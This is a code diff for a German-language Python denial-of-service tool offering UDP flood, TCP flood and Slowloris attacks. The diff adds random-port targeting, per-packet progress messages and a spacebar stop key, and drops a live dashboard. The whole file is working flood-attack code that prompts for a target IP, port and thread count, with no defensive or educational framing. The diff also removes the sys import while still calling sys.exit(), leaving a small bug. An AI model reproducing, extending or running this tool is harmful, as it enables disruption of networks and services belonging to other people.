@@ -3,7 +3,7 @@ import random
 import socket
 import threading
 import time
-import sys
+import keyboard
 
 # Globale Variablen
 packet_counter = 0
@@ -30,8 +30,11 @@ def udp_flood(ip, port, packet_size):
     udp_bytes = random._urandom(packet_size)
     while not stop_event.is_set():
         try:
+            if port == -1:
+                port = random.randint(1, 63350)
             sock.sendto(udp_bytes, (ip, port))
             packet_counter += 1
+            print(f"Gesendet {packet_counter} UDP-Pakete an {ip} über Port {port}")
         except:
             pass
 
@@ -41,9 +44,12 @@ def tcp_flood(ip, port, packet_size):
     while not stop_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if port == -1:
+                port = random.randint(1, 63350)
             sock.connect((ip, port))
             sock.send(random._urandom(packet_size))
             packet_counter += 1
+            print(f"Gesendet {packet_counter} TCP-Pakete an {ip} über Port {port}")
         except:
             pass
         finally:
@@ -67,6 +73,7 @@ def slowloris(ip, port):
             try:
                 sock.send(b"X-a: Keep-alive\r\n")
                 packet_counter += 1
+                print(f"Offen gehaltene Verbindungen: {len(sockets)}")
             except:
                 sockets.remove(sock)
 
@@ -84,13 +91,6 @@ def choose_color():
         "4": "\033[0m",
     }.get(choice, "\033[0m")
 
-# Live-Dashboard
-def dashboard():
-    global packet_counter
-    while not stop_event.is_set():
-        print(f"\r[INFO] Gesendete Pakete: {packet_counter}", end="")
-        time.sleep(1)
-
 # Hauptprogramm
 if __name__ == "__main__":
     color = choose_color()
@@ -105,7 +105,7 @@ if __name__ == "__main__":
 
         if choice in ["1", "2", "3"]:
             ip = input("Ziel-IP-Adresse: ")
-            port = int(input("Ziel-Port: "))
+            port = int(input("Ziel-Port (-1 für alle Ports): "))
             packet_size = int(input("Paketgröße in Bytes: "))
             num_threads = int(input("Anzahl der Threads: "))
 
@@ -124,13 +124,11 @@ if __name__ == "__main__":
                 thread.daemon = True
                 thread.start()
 
-            dashboard_thread = threading.Thread(target=dashboard)
-            dashboard_thread.daemon = True
-            dashboard_thread.start()
-
-            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+            print("\nDrücke die Leertaste, um den Angriff zu stoppen.\n")
+            keyboard.wait('space')
             stop_event.set()
+            print("\n[INFO] Angriff gestoppt.")
 
         elif choice == "4":
             print("[INFO] Programm beendet.")
-              sys.exit()
+            sys.exit()
